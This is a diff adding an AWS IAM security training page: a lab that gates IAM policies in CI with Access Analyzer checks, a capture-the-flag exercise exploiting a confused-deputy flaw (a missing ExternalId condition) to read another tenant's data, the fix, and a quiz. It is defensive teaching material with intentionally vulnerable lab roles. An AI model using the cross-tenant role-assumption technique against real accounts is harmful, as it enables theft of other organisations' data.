+          <p><b>Files:</b> <a href="labs/day1/robot/check_policies.py">check_policies.py</a> · <a href="labs/day1/robot/policy-robot.yml">policy-robot.yml</a> · <a href="labs/day1/robot/github-oidc-role.yaml">github-oidc-role.yaml</a> · <a href="labs/day1/robot/reference/baseline-identity.json">baseline-identity.json</a> · five sample policies in <code>robot/policies/</code>. <b>Prerequisites:</b> a GitHub account and the <code>gh</code> CLI (CloudShell: <code>sudo dnf install -y gh</code>, then <code>gh auth login</code>), or do Part A only.</p>
+
+          <h4>Part A — Run the robot by hand</h4>
+          <ol class="steps" data-lab="d1-lab4">
+            <li><strong>Read the baseline and predict</strong>
+              <p>The approved baseline (<code>reference/baseline-identity.json</code>) lets telemetry apps read/write <code>nimbus-telemetry-*</code> buckets and use the telemetry queues. Open the five files in <code>robot/policies/</code>. For each, predict <b>PASS</b> or <b>FAIL</b> and which check would catch it. Write it down. Really.</p>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1/robot &amp;&amp; for f in policies/*.json; do echo "== $f"; jq -c '.Statement[] | {Sid,Effect,Principal,Action,Resource,Condition}' "$f"; done</code></pre>
+            </li>
+            <li><strong>Try the three checks with the raw CLI</strong>
+<pre data-title="CloudShell (sky-dev)"><code class="language-bash">export AWS_PROFILE=sky-dev AWS_REGION=us-east-1
+aws accessanalyzer check-no-new-access --policy-type IDENTITY_POLICY \
+  --existing-policy-document file://reference/baseline-identity.json \
+  --new-policy-document file://policies/02-dream.identity.json --query '{result:result,msg:message}'
+aws accessanalyzer check-access-not-granted --policy-type IDENTITY_POLICY \
+  --policy-document file://policies/05-sleep.identity.json \
+  --access '[{"actions":["iam:PassRole"]}]' --query '{result:result,reasons:reasons}'
+aws accessanalyzer check-no-public-access --resource-type AWS::S3::Bucket \
+  --policy-document file://policies/03-never.bucket.json --query '{result:result,reasons:reasons}'</code></pre>
+              <p>Each answer is a <b>proof</b>, not a heuristic. <code>02-dream</code> narrows a wildcard bucket name and drops actions — the solver confirms it's a strict subset of the baseline.</p>
+<div class="predict"><p><code>02-dream</code> looks nothing like the baseline textually: different resource strings, fewer actions. Will <code>check-no-new-access</code> pass it?</p><details><summary>Reveal</summary><p><b>PASS.</b> The check compares the <em>sets of requests</em> each policy allows, not the text. Narrowing <code>nimbus-telemetry-*</code> to one bucket and dropping actions can only shrink that set.</p></details></div>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">aws accessanalyzer check-no-new-access --policy-type IDENTITY_POLICY … --new-policy-document file://policies/02-dream.identity.json --query '{result:result,msg:message}'</span>
+{
+    <span class="k">"result"</span>: <span class="ok">"PASS"</span>,
+    <span class="k">"msg"</span>: <span class="s">"The modified permissions do not grant new access compared to your existing policy."</span>
+}
+<span class="p">$</span> <span class="c">aws accessanalyzer check-access-not-granted … --access '[{"actions":["iam:PassRole"]}]' --query '{result:result,reasons:reasons}'</span>
+{
+    <span class="k">"result"</span>: …,
+    <span class="k">"reasons"</span>: [ … ]
+}</pre></div>
+<p class="term-caption">Exact <code>message</code> wording can vary by API version. Only <code>result</code> (<code>PASS</code> or <code>FAIL</code>) and the <code>reasons[].statementIndex</code> matter to the robot. The second result is left for you to predict.</p>
+            </li>
+            <li><strong>Run the robot over all five</strong>
+<pre data-title="CloudShell"><code class="language-bash">python3 -m pip install --quiet --user boto3 2&gt;/dev/null; python3 check_policies.py policies/</code></pre>
+              <p>Compare against your predictions. Read each <code>reasons</code> string — Access Analyzer tells you which statement introduced the problem.</p>
+<div class="term" data-title="CloudShell · sky-dev"><pre><span class="p">$</span> <span class="c">python3 check_policies.py policies/02-dream.identity.json</span>
+<span class="ok">✅</span> 02-dream.identity.json       no-new-access        PASS  
+<span class="ok">✅</span> 02-dream.identity.json       access-not-granted   PASS  
+
+<span class="ok">🟢 Robot approves. Ship it.</span></pre></div>
+<p class="term-caption">Output format for a single file. Run it over the whole <code>policies/</code> folder yourself: the failing filenames are the flag, so they're not shown here.</p>
+            </li>
+            <li><strong>Assemble the flag</strong>
+              <p>Take the word in each <b>failing</b> filename (e.g. <code>01-<u>robots</u>.identity.json</code>), in file order, join with underscores, and wrap it: <code>SKY{word_word_word}</code>.</p>
+            </li>
+            <li><strong>Fix <code>01-robots</code> the right way</strong>
+              <p>Replace <code>s3:*</code> with exactly what the app needs (<code>s3:GetObject</code>, <code>s3:PutObject</code>, <code>s3:ListBucket</code>) and rerun the robot on that file. Then ask: why did <code>s3:*</code> fail <em>both</em> checks?</p>
+            </li>
+          </ol>
+          <form class="flag" data-id="d1-flag4" data-hash="911a55e00483ebe8e0b3751c1ffe422732d001a39dad33cfc856144e38dca9bb" data-xp="150" data-label="Flag 1.4 · what the robot rejected"></form>
+
+          <h4>Part B — Put the robot in CI</h4>
+          <ol class="steps" data-lab="d1-lab4b">
+            <li><strong>Create a lab repository</strong>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1/robot &amp;&amp; git init -q -b main &amp;&amp; mkdir -p .github/workflows &amp;&amp; mv policy-robot.yml .github/workflows/
+git add . &amp;&amp; git commit -qm "Least-privilege robot" &amp;&amp; gh repo create skyfortress-policies --private --source . --push</code></pre>
+            </li>
+            <li><strong>Deploy the OIDC provider and robot role — and study the trust policy</strong>
+              <p>Open <a href="labs/day1/robot/github-oidc-role.yaml">github-oidc-role.yaml</a>. The trust condition pins <code>sub</code> to <code>repo:&lt;you&gt;/skyfortress-policies:pull_request</code>. Its permissions are <em>only</em> the three check APIs plus <code>ValidatePolicy</code>.</p>
+<pre data-title="CloudShell (sky-dev)"><code class="language-bash">GH_USER=$(gh api user --jq .login)
+aws cloudformation deploy --stack-name sky-robot --template-file github-oidc-role.yaml \
+  --parameter-overrides GitHubOrg=$GH_USER RepoName=skyfortress-policies \
+  --capabilities CAPABILITY_NAMED_IAM
+ROBOT=$(aws cloudformation describe-stacks --stack-name sky-robot --query 'Stacks[0].Outputs[0].OutputValue' --output text)
+gh variable set ROBOT_ROLE_ARN --body "$ROBOT"</code></pre>
+              <p class="muted">Already have a GitHub OIDC provider in this account? Add <code>CreateProvider=false</code>.</p>
+            </li>
+            <li><strong>Open a malicious pull request</strong>
+<pre data-title="CloudShell"><code class="language-bash">git checkout -qb kraken/sneaky-policy
+cat &gt; policies/06-sneaky.identity.json &lt;&lt;'EOF'
+{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject","s3:PutBucketPolicy"],
+ "Resource":["arn:aws:s3:::nimbus-telemetry-raw","arn:aws:s3:::nimbus-telemetry-raw/*"]}]}
+EOF
+git add . &amp;&amp; git commit -qm "tiny tweak, nothing to see" &amp;&amp; git push -qu origin HEAD
+gh pr create --fill &amp;&amp; gh pr checks --watch</code></pre>
+              <p>The check fails: <code>s3:PutBucketPolicy</code> is both new access and on the critical list. Open the run page — the job summary shows the robot's table.</p>
+              <div class="predict"><p><code>06-sneaky</code> keeps the same bucket ARNs as the baseline and adds just one action. Which of the robot's checks fail?</p><details><summary>Reveal</summary><p><b>Both identity checks.</b> <code>check-no-new-access</code> fails because <code>s3:PutBucketPolicy</code> wasn't in the baseline, and <code>check-access-not-granted</code> fails because it's on the robot's critical-actions list. Small textual diffs can be big permission diffs.</p></details></div>
+              <figure class="shot" data-url="github.com/&lt;you&gt;/skyfortress-policies/pull/1/checks"><img src="assets/img/day1/shot-ci-failed.svg" alt="Mock-up of a pull request checks page: policy-robot / policy-checks failing after 23 seconds, merging blocked by a ruleset, and a job summary table showing 06-sneaky.identity.json failing no-new-access and access-not-granted"><figcaption><b>SCREEN 1.4a</b> What “blocked” looks like once the ruleset in the next step requires <code>policy-checks</code>. The OIDC step is green: no keys were involved. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+            </li>
+            <li><strong>Make the robot mandatory</strong>
+              <p>In GitHub: <b>Settings → Rules → Rulesets → New branch ruleset</b> targeting <code>main</code>, enable <b>Require status checks to pass</b> and add <code>policy-checks</code>. Now a human literally cannot click merge on a policy the robot rejects (unless they're a bypass actor — audit that list).</p>
+            </li>
+            <li><strong>Attack your own OIDC trust (thought experiment → real test)</strong>
+              <p>What if the trust used <code>StringLike</code> with <code>repo:*</code>? Any GitHub repo could assume the robot. Verify the pin is effective: push the same workflow to a <em>different</em> repo you own and watch <code>configure-aws-credentials</code> fail with "Not authorized to perform sts:AssumeRoleWithWebIdentity".</p>
+            </li>
+            <li><strong>Turn on unused-access analysis for the dev account</strong>
+<pre data-title="CloudShell (sky-dev)"><code class="language-bash">aws accessanalyzer create-analyzer --analyzer-name sky-unused --type ACCOUNT_UNUSED_ACCESS \
+  --configuration '{"unusedAccess":{"unusedAccessAge":30}}'
+# Findings take a while to generate. Come back tomorrow and run:
+ANALYZER=$(aws accessanalyzer list-analyzers --type ACCOUNT_UNUSED_ACCESS --query 'analyzers[0].arn' --output text)
+aws accessanalyzer list-findings-v2 --analyzer-arn "$ANALYZER" \
+  --query 'findings[].[findingType,resource,status]' --output table</code></pre>
+              <p>Expect <code>UnusedIAMRole</code> and <code>UnusedPermission</code> findings for the lab roles (roles created today won't show as unused until they've existed for the tracking period, so the first day is often quiet). For an <code>UnusedPermission</code> finding, <code>aws accessanalyzer generate-finding-recommendation</code> + <code>get-finding-recommendation</code> produce a trimmed policy you can feed straight into… the robot.</p>
+              <figure class="shot" data-url="console.aws.amazon.com/access-analyzer/home#/unused-access"><img src="assets/img/day1/shot-unused-access.svg" alt="Mock-up of IAM Access Analyzer unused access findings: counters for unused roles, permissions and keys, a table of UnusedIAMRole and UnusedPermission findings for lab roles, and a recommended action to remove unused actions"><figcaption><b>SCREEN 1.4b</b> A few days later. Every <code>UnusedPermission</code> finding comes with a recommended, trimmed policy. Run it through the robot before applying it. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+            </li>
+          </ol>
+          <div class="checkpoint"><p>A red ❌ on your PR, a ruleset that requires <code>policy-checks</code>, and an analyzer named <code>sky-unused</code> in <code>ACTIVE</code> status. If <code>configure-aws-credentials</code> fails on your <em>own</em> PR, check the <code>sub</code>: PRs from forks or <code>pull_request_target</code> events produce different claims.</p></div>
+          <h4>Troubleshooting</h4><div class="table-wrap"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td><code>ValidationException</code> from <code>check-no-public-access</code></td><td>Wrong <code>--resource-type</code> for the policy</td><td>Bucket policies use <code>AWS::S3::Bucket</code></td></tr><tr><td><code>configure-aws-credentials</code>: <code>Not authorized to perform sts:AssumeRoleWithWebIdentity</code></td><td>The token's <code>sub</code> doesn't match the trust policy (wrong repo name, or a fork / <code>pull_request_target</code> event)</td><td>Compare the <code>sub</code> in the trust policy with <code>repo:&lt;owner&gt;/skyfortress-policies:pull_request</code></td></tr><tr><td><code>Could not load credentials</code> in the workflow</td><td>Missing <code>permissions: id-token: write</code></td><td>Keep the <code>permissions</code> block from <code>policy-robot.yml</code></td></tr><tr><td>Stack fails: <code>EntityAlreadyExists</code> for the OIDC provider</td><td>This account already has a GitHub OIDC provider</td><td>Redeploy with <code>CreateProvider=false</code></td></tr><tr><td>PR is red but the Merge button still works</td><td>The ruleset isn't active, or you're a bypass actor</td><td>Set the ruleset to <b>Active</b> and review its bypass list</td></tr></tbody></table></div>
+          <details class="hint"><summary>Hint: "No OpenIDConnect provider found"</summary><p>The provider must exist in the <em>same account</em> as the role, with URL <code>https://token.actions.githubusercontent.com</code> and audience <code>sts.amazonaws.com</code>. And the workflow must have <code>permissions: id-token: write</code>, otherwise GitHub never issues the token.</p></details>
+          <div class="stretch"><p>Add a fourth gate: run <code>aws accessanalyzer validate-policy</code> in the robot and fail on any <code>SECURITY_WARNING</code> finding (e.g. <code>PassRole</code> with <code>NotResource</code>). Or swap in AWS's own <code>cfn-policy-validator</code> GitHub Action and compare its output on a CloudFormation template.</p></div>
+          <div class="cleanup">
+<pre><code class="language-bash">aws accessanalyzer delete-analyzer --analyzer-name sky-unused --profile sky-dev   # after tomorrow's review!
+aws cloudformation delete-stack --stack-name sky-robot --profile sky-dev
+gh repo delete skyfortress-policies --yes   # or keep it as a template for your team</code></pre>
+          </div>
+        </div>
+      </article>
+    </section>
+
+    <!-- ============ BOSS ============ -->
+    <section id="boss">
+      <div class="eyebrow">Boss fight</div>
+      <h2>The final door of the day</h2>
+      <div class="boss" data-flag="d1-boss">
+        <img src="assets/img/day1/boss-cover.svg" alt="Boss cover: a Kraken tentacle hands the vendor's scanner, drawn as a golden deputy star with a question mark, a ticket saying tenant kraken with Nimbus's role ARN; the scanner assumes OrbitalInsightsReadRole, whose padlock hangs open" style="width:calc(100% + 68px);max-width:none;margin:-34px -34px 26px;border-bottom:1px solid rgba(251,113,133,.5);aspect-ratio:16/5;object-fit:cover">
+        <div class="boss-grid">
+          <img src="assets/img/kraken.svg" alt="The Kraken">
+          <div>
+            <div class="eyebrow">Boss · 35 min · 400 XP · unlocks Day 1 badge</div>
+            <h3>The Confused Deputy</h3>
+            <div class="hp"><i></i></div>
+            <p>Nimbus uses <b>Orbital Insights</b>, a SaaS that scans customer accounts by assuming a role you create. The Kraken signed up as a customer too. The SaaS behaves correctly — it always sends each tenant's own ExternalId. But Nimbus's role trust was pasted from an old blog post and <b>doesn't check it</b>. Can a paying stranger make the vendor read Nimbus's secrets?</p>
+            <div class="paths">
+              <div class="path guided"><p>Seven steps: deploy vendor and victim, scan legitimately, attack as the Kraken tenant, fix the trust, re-test.</p></div>
+              <div class="path challenge"><p><b>Goal:</b> as tenant <code>kraken</code>, get the vendor to return Nimbus's report, then make that impossible without breaking tenant <code>nimbus</code>. <b>Constraint:</b> change only Nimbus's role. <b>Accept when:</b> <code>kraken → ASSUME_FAILED</code>, <code>nimbus → SCANNED</code>.</p></div>
+            </div>
+          </div>
+        </div>
+        <figure class="figure" style="margin-top:26px"><img src="assets/img/day1/confused-deputy.svg" alt="Kraken tenant submits Nimbus role ARN to the Orbital Insights SaaS in the vendor account, which assumes the Nimbus role because no ExternalId condition is present, and returns the telemetry report to the wrong tenant; fix panel shows the sts:ExternalId condition and the service-principal variant with aws:SourceArn and SourceOrgID"><figcaption><b>FIG B1</b> Authority from one party, intent from another. The ExternalId binds them back together.</figcaption></figure>
+        <ol class="steps" data-lab="d1-boss">
+          <li><strong>Deploy the vendor (in prod, playing the SaaS's AWS account)</strong>
+<pre data-title="CloudShell"><code class="language-bash">cd ~/sky/day1/confused-deputy
+aws cloudformation deploy --profile sky-prod --stack-name sky-vendor --template-file vendor.yaml --capabilities CAPABILITY_NAMED_IAM
+VENDOR_ROLE=$(aws cloudformation describe-stacks --profile sky-prod --stack-name sky-vendor \
+  --query "Stacks[0].Outputs[?OutputKey=='ScannerRoleArn'].OutputValue" --output text)</code></pre>
+          </li>
+          <li><strong>Onboard Nimbus as a customer (in dev)</strong>
+<pre data-title="CloudShell"><code class="language-bash">aws cloudformation deploy --profile sky-dev --stack-name sky-victim --template-file victim.yaml \
+  --parameter-overrides VendorScannerRoleArn=$VENDOR_ROLE --capabilities CAPABILITY_NAMED_IAM
+VICTIM_ROLE=$(aws cloudformation describe-stacks --profile sky-dev --stack-name sky-victim \
+  --query 'Stacks[0].Outputs[0].OutputValue' --output text)
+aws iam get-role --profile sky-dev --role-name OrbitalInsightsReadRole --query Role.AssumeRolePolicyDocument</code></pre>
+            <p>Look hard at that trust policy. Something's missing.</p>
+            <figure class="shot" data-url="console.aws.amazon.com/iam/home#/roles/details/OrbitalInsightsReadRole?section=trust_relationships"><img src="assets/img/day1/shot-trust-policy.svg" alt="Mock-up of the IAM role OrbitalInsightsReadRole Trust relationships tab: the trust policy allows the vendor's OrbitalInsightsScannerRole to call sts:AssumeRole with no Condition block; a red callout marks the missing sts:ExternalId condition"><figcaption><b>SCREEN B1</b> The trust policy as the console shows it. The principal is right, but there's no <code>Condition</code>, so the vendor's ExternalId is never checked. Illustrative mock-up; the live console layout may differ.</figcaption></figure>
+          </li>
+          <li><strong>Legit scan: Nimbus uses the SaaS as intended</strong>
+<pre data-title="CloudShell — simulating the SaaS frontend calling its backend"><code class="language-bash">aws lambda invoke --profile sky-prod --function-name OrbitalInsightsScanner --cli-binary-format raw-in-base64-out \
+  --payload "{\"tenant\":\"nimbus\",\"role_arn\":\"$VICTIM_ROLE\"}" nimbus.json &gt;/dev/null &amp;&amp; jq .status nimbus.json</code></pre>
+          </li>
+          <li><strong>The attack: you are tenant <code>kraken</code></strong>
+            <p>You log in to the SaaS as the Kraken and, in the "connect your AWS account" box, paste <em>Nimbus's</em> role ARN (role names for SaaS integrations are usually documented — easy to guess). The vendor sends <b>kraken's</b> ExternalId. <b>Predict:</b> does Nimbus's role accept it?</p>
+<pre data-title="CloudShell"><code class="language-bash">aws lambda invoke --profile sky-prod --function-name OrbitalInsightsScanner --cli-binary-format raw-in-base64-out \
+  --payload "{\"tenant\":\"kraken\",\"role_arn\":\"$VICTIM_ROLE\"}" kraken.json &gt;/dev/null &amp;&amp; jq . kraken.json
+jq -r '.report.flag_b64 // empty' kraken.json | base64 -d; echo    # the boss flag, if the attack worked</code></pre>
+            <p>A trust policy without a condition on <code>sts:ExternalId</code> ignores whatever ExternalId is sent. The vendor was the deputy, and it got confused.</p>
+<div class="term" data-title="CloudShell · sky-prod (the vendor)"><pre><span class="p">$</span> <span class="c">aws lambda invoke … --payload '{"tenant":"kraken","role_arn":"'$VICTIM_ROLE'"}' kraken.json &gt;/dev/null &amp;&amp; jq . kraken.json</span>
+{
+    <span class="k">"tenant"</span>: <span class="s">"kraken"</span>,
+    <span class="k">"status"</span>: <span class="warn">"SCANNED"</span>,
+    <span class="k">"report"</span>: { <span class="k">"fleet"</span>: <span class="s">"NIMBUS"</span>, <span class="k">"orbits"</span>: 42, <span class="k">"flag_b64"</span>: <span class="hl">"U0tZe████████"</span> }
+}
+<span class="p">$</span> <span class="c">jq -r '.report.flag_b64 // empty' kraken.json | base64 -d; echo</span>
+<span class="hl">SKY{█████████████████████████}</span></pre></div>
+<p class="term-caption">The wrong tenant got Nimbus's report. That's the boss flag, redacted here.</p>
+          </li>
+          <li><strong>Fix the trust policy</strong>
+<pre data-title="CloudShell"><code class="language-bash">sed "s|VENDOR_SCANNER_ROLE_ARN|$VENDOR_ROLE|" fixed-trust-policy.json &gt; trust.json
+aws iam update-assume-role-policy --profile sky-dev --role-name OrbitalInsightsReadRole --policy-document file://trust.json</code></pre>
+          </li>
+          <li><strong>Re-run both tenants</strong>
+<pre data-title="CloudShell"><code class="language-bash">for T in kraken nimbus; do
+  aws lambda invoke --profile sky-prod --function-name OrbitalInsightsScanner --cli-binary-format raw-in-base64-out \
+    --payload "{\"tenant\":\"$T\",\"role_arn\":\"$VICTIM_ROLE\"}" $T.json &gt;/dev/null; echo "$T → $(jq -r .status $T.json)"
+done</code></pre>
+            <p><code>kraken → ASSUME_FAILED</code>, <code>nimbus → SCANNED</code>. The vendor's per-tenant secret now binds Nimbus's role to Nimbus's tenancy.</p>
+<div class="predict"><p>After the fix, the vendor sends <code>kraken</code>'s ExternalId for the Kraken tenant. What does Nimbus's trust policy do with it?</p><details><summary>Reveal</summary><p><b>Denies the AssumeRole.</b> The condition requires <code>sts:ExternalId</code> to equal Nimbus's value (<code>oi-tenant-…-nimbus</code>), and the vendor never sends that value for any other tenant. The vendor's error comes back as <code>ASSUME_FAILED</code>.</p></details></div>
+<div class="term" data-title="CloudShell · sky-prod (the vendor)"><pre><span class="p">$</span> <span class="c">for T in kraken nimbus; do …; done</span>
+kraken → <span class="err">ASSUME_FAILED</span>
+nimbus → <span class="ok">SCANNED</span></pre></div>
+<p class="term-caption">Exactly one tenant can scan Nimbus now. If both fail, the ExternalId in <code>trust.json</code> doesn't match the vendor's registry: compare it with the stack output <code>NimbusExternalId</code>.</p>
+          </li>
+          <li><strong>Explain the service-principal flavour</strong>
+            <p>In two sentences: why does a bucket policy letting <code>cloudtrail.amazonaws.com</code> write need <code>aws:SourceArn</code> or <code>aws:SourceAccount</code>, and how does the RCP from Lab 1.3 (<code>EnforceConfusedDeputyProtection</code>, using <code>aws:SourceOrgID</code>) cover that across every account at once?</p>
+          </li>
+        </ol>
+        <h4>Troubleshooting</h4><div class="table-wrap"><table><thead><tr><th>Symptom</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody><tr><td>Both tenants get <code>ASSUME_FAILED</code> after the fix</td><td><code>VENDOR_SCANNER_ROLE_ARN</code> or the ExternalId in <code>trust.json</code> is wrong</td><td><code>jq . trust.json</code>; compare with the <code>sky-vendor</code> outputs <code>ScannerRoleArn</code> and <code>NimbusExternalId</code></td></tr><tr><td>Both tenants get <code>SCANNED</code> after the fix</td><td><code>update-assume-role-policy</code> went to the wrong account</td><td>Run it with <code>--profile sky-dev</code>; the role lives in dev</td></tr><tr><td><code>ResourceNotFoundException</code> invoking the scanner</td><td>Vendor stack is in prod; you invoked it in dev</td><td>Use <code>--profile sky-prod</code> for every <code>lambda invoke</code></td></tr></tbody></table></div>
+        <div class="callout gotcha"><strong class="ct">Gotcha: ExternalId is not a password</strong><p>It isn't secret from the vendor and doesn't need to be secret from the world. Its job is <em>uniqueness per tenant, chosen by the vendor</em>. If a SaaS lets customers <b>type their own</b> ExternalId, the protection collapses — the Kraken would just type Nimbus's.</p></div>
+        <form class="flag" data-id="d1-boss" data-hash="6fcddf7a5dd33dc3287da3b3551a6a87efe4ce7cfedf869856826c2239044497" data-xp="400" data-badge="day1" data-label="Boss flag · the stolen report"></form>
+        <div class="cleanup">
+<pre><code class="language-bash">aws cloudformation delete-stack --profile sky-dev --stack-name sky-victim
+aws cloudformation delete-stack --profile sky-prod --stack-name sky-vendor
+aws secretsmanager delete-secret --profile sky-dev --secret-id skyfortress/boss/telemetry-report --force-delete-without-recovery 2&gt;/dev/null</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ QUIZ ============ -->
+    <section id="quiz">
+      <div class="eyebrow">Knowledge check</div>
+      <h2>Quiz <span class="quiz-score" style="font-size:1rem"></span></h2>
+      <p class="muted">Scenario questions. 20 XP each. Explanations unlock after you answer.</p>
+      <div class="quiz" data-id="d1-quiz">
+        <div class="q" data-answer="c">
+          <p>An SCP attached to the Workloads OU allows only <code>s3:*</code> and <code>ec2:*</code> (FullAWSAccess has been detached). A role in a Workloads account has the AdministratorAccess managed policy. What can it do?</p>
+          <div class="opts"><button data-k="a">Everything — AdministratorAccess overrides SCPs</button><button data-k="b">Nothing — SCPs replace identity policies</button><button data-k="c">Only S3 and EC2 actions</button><button data-k="d">Only actions that both the SCP and AdministratorAccess explicitly list by name</button></div>
+          <div class="explain">Effective permissions are the intersection: SCP ceiling (S3 + EC2) ∩ identity grant (everything) = S3 + EC2. Wildcards work fine in both; nothing needs to be "listed by name".</div>
+        </div>
+        <div class="q" data-answer="b">
+          <p>A Kraken account outside your org has a role with <code>s3:GetObject</code> on <code>*</code>. Your bucket policy accidentally allows <code>"Principal": "*"</code> for <code>s3:GetObject</code>. Which control stops the read, regardless of the bucket policy?</p>
+          <div class="opts"><button data-k="a">An SCP on your account denying requests unless aws:PrincipalOrgID matches</button><button data-k="b">An RCP on your account denying requests unless aws:PrincipalOrgID matches</button><button data-k="c">A permissions boundary on your bucket</button><button data-k="d">Nothing — cross-account access always requires the caller's identity policy, which allows it</button></div>
+          <div class="explain">SCPs only constrain principals <em>in your org</em> — the Kraken's role isn't one. RCPs constrain access to <em>your resources</em> from anyone. Boundaries attach to users/roles, not buckets.</div>
+        </div>
+        <div class="q" data-answer="d">
+          <p>Your role has <code>lambda:CreateFunction</code> and <code>iam:PassRole</code> with <code>"Resource": "arn:aws:iam::*:role/app/*"</code> and condition <code>iam:PassedToService = lambda.amazonaws.com</code>. Which call succeeds?</p>
+          <div class="opts"><button data-k="a">ec2 run-instances with an instance profile for role/app/web</button><button data-k="b">lambda create-function with role/privileged/ops</button><button data-k="c">iam attach-role-policy on role/app/web</button><button data-k="d">lambda create-function with role/app/worker</button></div>
+          <div class="explain">Only (d) matches both the resource path and the service condition. (a) is passed to EC2, (b) is the wrong path, (c) needs a different permission entirely.</div>
+        </div>
+        <div class="q" data-answer="a">
+          <p>Same account. A bucket policy grants <code>s3:GetObject</code> to <code>arn:aws:sts::111122223333:assumed-role/Analyst/alice</code>. Alice's role has a permissions boundary that doesn't include S3. Can Alice read?</p>
+          <div class="opts"><button data-k="a">Yes — a same-account resource policy naming the session ARN is sufficient</button><button data-k="b">No — the boundary always caps the role</button><button data-k="c">No — role sessions can't be named in bucket policies</button><button data-k="d">Only if her identity policy also allows it</button></div>
+          <div class="explain">The same-account shortcut applies when the resource policy names the role <em>session</em> (or an IAM user). Had it named the role ARN, the boundary would cap it. This is the dashed arrow in FIG 1.1.</div>
+        </div>
+        <div class="q" data-answer="c">
+          <p>Your GitHub OIDC role trust policy has <code>StringEquals</code> on <code>aud = sts.amazonaws.com</code> and nothing else. What's the risk?</p>
+          <div class="opts"><button data-k="a">None — aud proves the token was issued for AWS</button><button data-k="b">Only your org's forks can assume it</button><button data-k="c">Any workflow in any GitHub repository can assume the role</button><button data-k="d">Tokens could be replayed after expiry</button></div>
+          <div class="explain">Every GitHub Actions token has the same issuer and the <code>aud</code> you request. Only the <code>sub</code> (and similar claims) identifies the repo/branch/environment. Without pinning it, the trust is "anyone on GitHub".</div>
+        </div>
+        <div class="q" data-answer="b">
+          <p>You want every account in the org to enforce IMDSv2 by default, including accounts whose admins might try to change the account-level default later. Best tool?</p>
+          <div class="opts"><button data-k="a">An SCP denying ec2:RunInstances unless ec2:MetadataHttpTokens = required</button><button data-k="b">An EC2 declarative policy setting instance_metadata_defaults http_tokens = required</button><button data-k="c">An RCP on EC2 instances</button><button data-k="d">An AWS Config rule with auto-remediation</button></div>
+          <div class="explain">The SCP (a) is a good complementary control, but the declarative policy pins the service configuration itself so it can't be changed in the account. RCPs don't cover EC2. Config detects and fixes after the fact.</div>
+        </div>
+        <div class="q" data-answer="d">
+          <p>Which statement about SCPs in 2026 is <b>false</b>?</p>
+          <div class="opts"><button data-k="a">You can attach up to 10 SCPs to a single OU</button><button data-k="b">An SCP can be up to 10,240 characters</button><button data-k="c">SCPs support conditions on Allow statements</button><button data-k="d">SCPs restrict the management account when attached to the root</button></div>
+          <div class="explain">SCPs (and RCPs) never apply to the management account, no matter where they're attached. That's why it should hold no workloads. The other three reflect the 2025–2026 changes.</div>
+        </div>
+        <div class="q" data-answer="a">
+          <p>A SaaS vendor lets each customer type their own ExternalId in the onboarding form. What's wrong?</p>
+          <div class="opts"><button data-k="a">An attacker tenant can type the victim's ExternalId, defeating confused-deputy protection</button><button data-k="b">Nothing, as long as the ExternalId is long and random</button><button data-k="c">ExternalIds must be UUIDs generated by AWS</button><button data-k="d">ExternalId only works with IAM users</button></div>
+          <div class="explain">The vendor must assign a unique ExternalId per tenant and always send the authenticated tenant's value. Customer-chosen values can be copied.</div>
+        </div>
+        <div class="q" data-answer="c">
+          <p>Your data perimeter SCP denies S3 access unless <code>aws:ResourceOrgID</code> matches your org. Overnight, EC2 instances fail to install packages. Most likely cause?</p>
+          <div class="opts"><button data-k="a">The SCP has a syntax error</button><button data-k="b">IMDSv2 is blocking the instance credentials</button><button data-k="c">Package repositories are served from AWS-owned S3 buckets outside your org</button><button data-k="d">RCPs override SCPs at night</button></div>
+          <div class="explain">Classic perimeter gotcha. Some AWS-managed artifacts live in AWS-owned buckets. Production perimeters carve out those known resources explicitly (see AWS's data-perimeter-policy-examples) instead of loosening the whole policy.</div>
+        </div>
+        <div class="q" data-answer="b">
+          <p>Access Analyzer <code>check-no-new-access</code> returns PASS for a new policy compared to your baseline. What does that guarantee?</p>
+          <div class="opts"><button data-k="a">The new policy is identical to the baseline</button><button data-k="b">Every request the new policy allows is also allowed by the baseline</button><button data-k="c">The new policy grants no public access</button><button data-k="d">The policy will never be denied by an SCP</button></div>
+          <div class="explain">It's a proven subset relation: no new access. The policy can be smaller or textually very different. Public access is a different check, and SCPs aren't considered.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ DEBRIEF ============ -->
+    <section id="debrief">
+      <div class="eyebrow">Debrief</div>
+      <h2>What you defended today</h2>
+      <div class="story reveal">
+        <img class="avatar" src="assets/img/owlsley.svg" alt="Owlsley">
+        <div>
+          <div class="who">OWLSLEY · end-of-day transmission</div>
+          <p>The Kraken came at us four ways today — a PassRole side door, a public bucket policy, a pipeline trust, and a confused vendor — and every one of them was a <em>policy</em>, not a vulnerability. You closed each with layers: one in the account, one at the boundary, one in the org. Tomorrow they'll stop knocking on the front door and start moving quietly. Day 2 is about seeing them do it. Get some sleep. Hoo.</p>
+        </div>
+      </div>
+      <div class="grid g3" style="margin-top:28px">
+        <div class="card"><h3>🔑 Remember</h3><p>Default deny · explicit deny wins · guardrails never grant. Trace any surprise through the seven steps.</p></div>
+        <div class="card"><h3>🧱 Build</h3><p>SCP for your principals, RCP for your resources, declarative for your configuration, endpoint policies for your networks.</p></div>
+        <div class="card"><h3>🤖 Automate</h3><p>Generate from CloudTrail, trim with unused access, gate with custom policy checks. Humans review intent; robots prove properties.</p></div>
+      </div>
+    </section>
+
+    <div class="pager"><a class="prev" href="setup.html"><small>← Previous</small>Lab 0 · Setup</a><a class="next" href="day2.html"><small>Next →</small>Day 2 · Eyes in the Sky</a></div>
+  </main>
+</div>
+
+<footer id="site-footer"></footer>
+<script>
+  // Fill __SITE__ in code samples with this site's base URL so curl commands work as-is.
+  (function () {
+    var base = location.href.replace(/[#?].*$/, "").replace(/[^\/]*$/, "");
+    document.querySelectorAll("pre code").forEach(function (c) {
+      if (c.textContent.indexOf("__SITE__") !== -1) c.textContent = c.textContent.split("__SITE__").join(base);
+    });
+  })();
+</script>
